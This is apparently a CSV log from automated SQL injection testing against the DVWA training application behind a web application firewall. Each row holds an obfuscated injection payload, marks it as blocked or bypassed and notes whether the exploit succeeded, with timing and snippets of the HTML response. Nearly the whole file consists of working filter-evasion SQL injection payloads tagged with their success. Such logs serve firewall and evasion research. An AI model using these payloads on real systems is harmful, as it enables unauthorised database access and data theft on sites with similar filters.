Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@!=1%0b||+!%0b1=%0b(!+1)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0243,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0b||+not+{a+1}=1=%0b(!%0b{a%0b1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0196,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0bor+not~0=+(!%0b{a+1}=1)+||%27,Bypassed,No,None,Unknown,0.0263,70.06,No,500,
0%27<@=1.%0b||+!+{x%0b(select+1)}=1=+(not%0btrue)+||',Bypassed,No,None,Unknown,0.023,70.06,No,500,
0%27<@=1+or%0b{`if`+1}=1%0blike+{x%0b(select+1)}=1%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0209,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0bor+not+1=%0b(not+{x+(select%0b1)}=1)--+,Bypassed,No,None,piggyAtk,0.0218,70.06,No,500,
0%27<@=.1+||+!%0b{a+1}=1=%0b(!%0b{a%0b1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0181,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or%0b0=+(not%7efalse)%0b||%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0291,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or%0bnot%0b{x%0b(select%0b1)}=1=%0b(!+{x%0b(select+1)}=1)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.026,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor%0bnot%0b{x+(select+1)}=1=+(not%0b{x%0b(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0147,70.06,No,500,
0%27<@!=.1+or+not+{a%0b1}=1=%0b(not%7efalse)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0235,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0b||+not+{a+1}=1=+(!~false)+or',Bypassed,No,None,booleanAtk,0.0305,70.06,No,500,
0%27<@=1.%0b||%0bnot+{`if`+1}=1=+(not%0btrue)%0bor',Bypassed,No,None,booleanAtk,0.0249,70.06,No,500,
0'<@=1.%0bor+!%0b{`if`+1}=1=%0b(!+{x%0b(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0256,70.06,No,500,
0%27<@!=1%0b||+!+{x+(select%0b1)}=1=%0b(not~0)+||',Bypassed,No,None,Unknown,0.0259,70.06,No,500,
0%27<@=.1%0b||+not+{x+(select+1)}=1=+(not%0b{`if`+1}=1)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0147,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0bor+{x%0b(select+1)}=1+like+{x+(select+1)}=1%0b||%27,Bypassed,No,None,Unknown,0.0152,70.06,No,500,
0'<@!=.1%0bor+!+{`if`+1}=1=+(not%0b{a+1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0221,70.06,No,500,
0%27<@=1.+||+!%0b{x+(select%0b1)}=1=%0b(!~false)%0bor',Bypassed,No,None,booleanAtk,0.0193,70.06,No,500,
0%27<@!=1+||+!+{`if`%0b1}=1=+(not%0b{`if`%0b1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0315,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or+!+{`if`%0b1}=1=%0b(not+{a+1}=1)+or%27,Bypassed,No,None,Unknown,0.0359,70.06,No,500,
0'<@=1+or+!%7efalse=%0b(!%7e0)%0bor%27,Bypassed,No,None,booleanAtk,0.0451,70.06,No,500,
0%27<@!=1+or+not%0b{x%0b(select+1)}=1=+(0)%0b||',Bypassed,No,None,Unknown,0.0336,70.06,No,500,
0'<@=.1+||+!%7e0=%0b(!%0b{a%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0164,70.06,No,500,
0%27<@=1.%0bor+not%0b{x+(select%0b1)}=1=%0b(not%0b{x%0b(select%0b1)}=1)%0b||',Bypassed,No,None,Unknown,0.0271,70.06,No,500,
0'||+@<@.+||%0b!%7e0=+(not%0b{x+(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.014,70.06,No,500,
0%27<@=1.+||+!+{x+(select+1)}=1=%0b(not+{x+(select+1)}=1)%0bor%27,Blocked,No,None,Unknown,0.0181,70.06,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1+||+not+{`if`%0b1}=1=+(!+{x+(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0216,70.06,No,500,
0'<@=.1+||%0bnot+{x+(select%0b1)}=1=+(!~0)%23,Blocked,No,None,piggyAtk,0.0103,70.06,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1+||%0bnot+{x+(select%0b1)}=1=%0b(not%0b{a+1}=1)%23,Blocked,No,None,piggyAtk,0.0184,70.06,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.%0bor+1+like%0b{a+1}=1+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.039,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||+not+{a+1}=1=%0b(false)+or',Bypassed,No,None,booleanAtk,0.0175,70.06,No,500,
0'<@=.1+or%0b!+{a+1}=1=%0b(not%0b{x%0b(select%0b1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.064,70.4,No,500,
0%27<@=1%0b||%0b!+{a%0b1}=1=+(not%0b{x%0b(select%0b1)}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.024,70.75,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or+not+{a%0b1}=1=+(!%0b{x+(select+1)}=1)--+,Bypassed,No,None,piggyAtk,0.0383,70.75,No,500,
0'<@=1+||%0b!~false=+(!+{`if`+1}=1)+or%27,Bypassed,No,None,booleanAtk,0.0247,70.75,No,500,
0%27<@=1.%0b||%0bnot%7e0=+(not+{`if`%0b1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0174,70.75,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+or+not+1=%0b(!+{x+(select+1)}=1)%0bor%27,Bypassed,No,None,Unknown,0.0378,70.75,No,500,
0%27<@!=1.+or%0b{x+(select+1)}=1+like+{a+1}=1+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.032,70.75,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0b||+!+{x%0b(select+1)}=1=%0b(not%7efalse)+or',Bypassed,No,None,booleanAtk,0.0255,70.75,No,500,
0%27<@!=.1%0bor+not%0b{a+1}=1=%0b(!%0b{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0331,69.44,No,500,
0%27<@=.1+||+not+{`if`%0b1}=1=+(not%0b{x+(select+1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0345,69.91,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||+not+{x+(select+1)}=1=+(not+{x%0b(select%0b1)}=1)+or',Blocked,No,None,Unknown,0.0201,69.91,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1+||%0b!+{x+(select%0b1)}=1=%0b(!~false)+||%27,Blocked,No,None,Unknown,0.0207,69.91,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1+||%0bnot%0b{`if`%0b1}=1=%0b(!+{a+1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0143,69.91,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0bor+not+{`if`+1}=1=+(!~0)%23,Bypassed,No,None,piggyAtk,0.0331,70.06,No,500,
0%27<@!=.1%0b||+not%0b{x%0b(select%0b1)}=1=%0b(not%0btrue)+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0508,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or+!+{`if`+1}=1=+(!+{x+(select+1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0281,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+or+not+1=+(not+{a+1}=1)--+,Blocked,No,None,piggyAtk,0.0186,70.06,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1%0bor%0b!%0b{x+(select+1)}=1=+(not+{`if`%0b1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0158,70.06,No,500,
0'<@!=1+or%0b!%0b1=%0b(!+{`if`%0b1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0212,70.06,No,500,
0%27<@!=.1%0b||+not+{x%0b(select+1)}=1=%0b(not%7efalse)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0251,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+||%0bnot+{a+1}=1=%0b(!+{`if`%0b1}=1)%23,Bypassed,No,None,piggyAtk,0.0272,70.06,No,500,
0'<@=1.%0bor%0b!%0b{x%0b(select+1)}=1=+(not%0b{a%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0277,70.06,No,500,
0'<@=1%0bor+not%7efalse%0bis%0bfalse%0bor',Bypassed,No,None,booleanAtk,0.0204,70.06,No,500,
0'<@=1.+or+not%0b{`if`+1}=1=+(!+{a%0b1}=1)+||%27,Bypassed,No,None,Unknown,0.0277,70.06,No,500,
0'<@=1+||%0b!~0=%0b(not+{x+(select%0b1)}=1)%23,Bypassed,No,None,piggyAtk,0.0173,70.06,No,500,
0%27<@=.1+||+not%7e0=%0b(not%0b{x+(select+1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0219,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or%0bnot%0b{`if`+1}=1=%0b(not%0b{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0345,70.06,No,500,
0%27<@=1.%0bor+!%0b{`if`+1}=1+is+false+or',Bypassed,No,None,booleanAtk,0.0202,70.06,No,500,
0%27<@!=1+||+not+{x+(select+1)}=1=+(not+{x+(select+1)}=1)%0bor%27,Blocked,No,None,Unknown,0.0177,70.06,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1%0bor%0bnot+{`if`%0b1}=1=+(!+{a%0b1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0152,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0bor%0bnot%0b{`if`%0b1}=1=%0b(not%0b{x%0b(select%0b1)}=1)%0b||',Bypassed,No,None,Unknown,0.0168,70.06,No,500,
0%27<@!=.1%0b||+!%0b{a+1}=1=%0b(not+1)+or',Bypassed,No,None,Unknown,0.0231,70.06,No,500,
0'<@=1.+or+!+{a%0b1}=1=+(not%0b{x%0b(select%0b1)}=1)%23,Bypassed,No,None,piggyAtk,0.024,70.06,No,500,
0%27<@!=.1%0bor%0bnot+1=%0b(!%0b1)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0428,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+||+not+{x+(select+1)}=1=%0b(not~0)+or%27,Blocked,No,None,Unknown,0.023,70.06,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.%0b||+!%0b{`if`%0b1}=1=%0b(!~0)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0148,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0b||+not%0b{a%0b1}=1=%0b(not%0btrue)+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0206,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+or%0bnot+{x+(select%0b1)}=1=+(!%0b{a+1}=1)%23,Blocked,No,None,piggyAtk,0.0084,70.06,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.+||%0bnot+{`if`%0b1}=1=%0b(not+{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0282,70.06,No,500,
0'<@!=.1%0bor%0bnot+{x+(select+1)}=1=%0b(not%0b{`if`+1}=1)+or%27,Bypassed,No,None,Unknown,0.0128,70.06,No,500,
0%27<@=1+or+!+{a+1}=1=%0b(!+{x%0b(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0152,70.06,No,500,
